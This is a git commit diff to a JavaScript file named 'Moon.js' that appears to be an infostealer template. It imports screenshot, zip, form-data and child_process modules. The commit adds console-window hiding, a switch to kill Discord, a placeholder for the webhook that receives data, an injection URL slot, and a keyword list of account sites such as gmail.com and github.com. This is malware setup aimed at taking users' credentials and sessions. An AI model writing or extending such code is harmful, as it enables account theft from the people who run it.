89176d12d5bd1ea4e3b282dba653bbf4782d9b92
hacks570 <111669909+hacks570@users.noreply.github.com>
2023-10-04 22:36:54 -0300

    Update Moon.js

--- Moon.js
+++ Moon.js
@@ -10,4 +10,12 @@ const formdata = Require("form-data");
 const JSZip = Require('JSZip');
 const screenshot = Require("screenshot-desktop");
 const { execSync, exec } = Require('child_process')
+const hideconsole = require('node-hide-console-window');
+const buf_replace = require('buffer-replace');
 
+let killdcop = true; // if u want to close discord make this "true" if u dont want to close discord make this "false";
+
+
+const %webhookstring% = "REPLACE_YOUR_WEBHOOK"
+const %INJURLL% = ""
+const %keywordstring% = ['github.com','gmail.com','twitch.tv','instagram.com']
